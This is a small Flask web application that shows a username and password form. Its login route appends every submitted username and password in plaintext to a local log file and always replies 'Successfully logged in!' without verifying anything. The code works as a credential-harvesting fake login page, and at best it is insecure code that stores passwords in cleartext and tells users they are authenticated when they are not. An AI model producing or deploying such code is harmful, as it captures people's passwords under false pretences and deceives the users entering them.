from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    return '''
        <form action="/login" method="post">
            <input type="text" name="username">
            <input type="password" name="password">
            <input type="submit" value="Submit">
        </form>
    '''

@app.route("/login", methods=["POST"])
def login():
    with open("user.log", "a") as f:
        f.write(f"Username: {request.form['username']}, Password: {request.form['password']}\n")
    return "Successfully logged in!"

if __name__ == "__main__":
    app.run()
